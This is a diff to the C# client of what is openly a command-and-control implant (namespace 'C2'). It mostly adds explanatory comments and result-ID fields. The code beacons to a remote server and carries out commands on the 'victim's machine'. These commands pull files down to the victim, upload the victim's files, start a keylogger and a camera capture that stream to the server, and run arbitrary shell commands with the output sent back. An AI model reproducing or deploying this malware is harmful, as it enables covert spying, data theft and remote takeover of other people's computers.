@@ -29,13 +29,14 @@ namespace C2
 
             while (true)
             {
-                // each 15 seconds the program will try to connect to the remote server
+                // each 5 seconds the program will try to connect to the remote server
                 bool connectionSuccess = false;
                 while (!connectionSuccess)
                 {
                     Thread.Sleep(1000 * 5);
                     try
                     {
+                        // the first request should be a handshake (to the /handshake route)
                         requestResult = server.PostAsync(url + "/handshake", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { machineNameFormData })).Result.Content.ReadAsStringAsync().Result;
                         Console.WriteLine(requestResult);
                         connectionSuccess = true;
@@ -47,12 +48,13 @@ namespace C2
 
                 }
 
-                // make the connection, if the connection fails it gets back to trying the connection
+                // establish the connection, if the connection fails it gets back to trying the connection
                 bool readySuccess = true;
                 while (readySuccess)
                 {
                     try
                     {
+                        // this endpoint (/ready) indicates that the victim is ready to receive commands
                         requestResult = server.PostAsync(url + "/ready", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { machineNameFormData })).Result.Content.ReadAsStringAsync().Result;
                         ManageCommand(requestResult);
                         readySuccess = true;
@@ -66,18 +68,23 @@ namespace C2
             }
         }
 
+
+        // this is where the command logic is happening
         static async void ManageCommand(string command)
         {
-            string[] args = command.Trim().Split(' ');
+            string[] args = command.Trim().Split(' '); // parsing the command using spaces
 
 
-            switch (args[0])
+            switch (args[0]) // the first token of the command should be the name of the command itself
             {
+                // the ping command is useful to determine if a host is up and ready to receive commands
                 case "ping":
+                   
                     requestResult = server.PostAsync(url + "/pong", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { machineNameFormData })).Result.Content.ReadAsStringAsync().Result;
                     Console.WriteLine(requestResult);
                     break;
 
+                // download lets you download files on the victim's machine
                 case "download":
                     /*
                         A download command looks like this:
@@ -106,7 +113,7 @@ namespace C2
                             skipped++;
                     }
 
-                    string[] files = string.Join(" ", args.Skip(skipped)).Split("\"")
+                    string[] files = string.Join(" ", args.Skip(skipped)).Split("\"") // this takes the rest of the command skipping flags
                         .Where(s => !string.IsNullOrWhiteSpace(s)).ToArray();
 
                     string fullPath = string.Empty;
@@ -132,15 +139,14 @@ namespace C2
                     }
 
 
+                    // this is were the file get's downloaded
                     if (skipped != 3)
                     {
-                        // this is were the file get's downloaded
                         KeyValuePair<string, string> fileFormData = new KeyValuePair<string, string>("file", files[0]);
 
+                        // requesting the file from the server
                         using (HttpResponseMessage response = server.PostAsync(url + "/download", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { fileFormData })).Result)
                         {
-                            
-
                             // Check if the request was successful
                             if (response.IsSuccessStatusCode)
                             {
@@ -171,17 +177,19 @@ namespace C2
                             {
                                 // Display the status code and reason phrase
                                 downloadStatus = $"Failed to download file: {response.StatusCode} {response.ReasonPhrase}";
-                                Console.WriteLine($"[X] Failed to download file: {response.StatusCode} {response.ReasonPhrase}");
                             }
+                            Console.WriteLine(downloadStatus);
                         }
                     }
 
-                    KeyValuePair<string, string> fileDownloadResult = new KeyValuePair<string, string>("result", downloadStatus);
-                    HttpResponseMessage r = server.PostAsync(url + "/result", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { fileDownloadResult, machineNameFormData })).Result;
+                    KeyValuePair<string, string> fileDownloadResult = new KeyValuePair<string, string>("result", downloadStatus); // sending the status back to the server
+                    KeyValuePair<string, string> idDownload = new KeyValuePair<string, string>("command_id", "upload"); // this is an id to send the data to the ritht location on the server
+                    HttpResponseMessage r = server.PostAsync(url + "/result", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { fileDownloadResult, machineNameFormData, idDownload })).Result;
                     await Console.Out.WriteLineAsync(r.Content.ToString());
 
                     break;
 
+                // this command is for uploading files on the server from the victim's machine
                 case "upload":
                     string filePath = string.Join(" ", args.Skip(1)).Trim('\"');
                     string uploadStatus = string.Empty;
@@ -197,6 +205,7 @@ namespace C2
                                 fileContent.Headers.ContentType = MediaTypeHeaderValue.Parse("multipart/form-data");
                                 content.Add(fileContent, "file", Path.GetFileName(filePath));
 
+                                // sending the content to the /upload endpoint
                                 var response = await server.PostAsync(url + "/upload", content);
 
                                 if (response.IsSuccessStatusCode)
@@ -223,12 +232,15 @@ namespace C2
                         Console.WriteLine(uploadStatus);
                     }
 
+                    // sending back the result
                     KeyValuePair<string, string> fileUploadResult = new KeyValuePair<string, string>("result", uploadStatus);
-                    HttpResponseMessage resp = server.PostAsync(url + "/result", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { fileUploadResult, machineNameFormData })).Result;
+                    KeyValuePair<string, string> idUpload = new KeyValuePair<string, string>("command_id", "download");
+                    HttpResponseMessage resp = server.PostAsync(url + "/result", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { fileUploadResult, machineNameFormData, idUpload })).Result;
                     await Console.Out.WriteLineAsync(resp.Content.ToString());
                     
                     break;
-                    
+                
+                // this command should start the keylogging process which sends the data directly to the server
                 case "log":
                     string message = string.Empty;
 
@@ -252,6 +264,7 @@ namespace C2
                         }
                         process.StartInfo.FileName = keyloggerPath; // Path to the keylogger executable file
                         process.StartInfo.Arguments = url.ToString(); // Command-line arguments
+                        // we need to pass the url so that the process knows where to send the data
 
 
                         if (process.Start())
@@ -277,7 +290,7 @@ namespace C2
                      }));
                     break;
 
-
+                // this command strarts the camera process that sends data directly to the server
                 case "camera":
 
                     if (!processName.Equals(string.Empty))
@@ -305,6 +318,7 @@ namespace C2
 
                     break;
 
+                // this command stops teh current process
                 case "end":
 
                     if (args[1] == "log")
@@ -334,11 +348,13 @@ namespace C2
 
                     break;
 
-
+                // this command is to execute shell commands on the victim's machine
                 case "shell":
                     KeyValuePair<string, string> result = new KeyValuePair<string, string>("result", ExecuteCommand(string.Join(" ", args.Skip(1))));
+                    KeyValuePair<string, string> idShell = new KeyValuePair<string, string>("command_id", "command");
 
-                    using (HttpResponseMessage response = server.PostAsync(url + "/result", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { result, machineNameFormData })).Result)
+
+                    using (HttpResponseMessage response = server.PostAsync(url + "/result", new FormUrlEncodedContent(new List<KeyValuePair<string, string>> { result, machineNameFormData, idShell })).Result)
                     {
                         Console.WriteLine(response.Content.ToString());
                     }
@@ -352,6 +368,7 @@ namespace C2
             }
         }
 
+        // executes a command on the machine
         private static string ExecuteCommand(string command)
         {
             ProcessStartInfo startInfo = new ProcessStartInfo
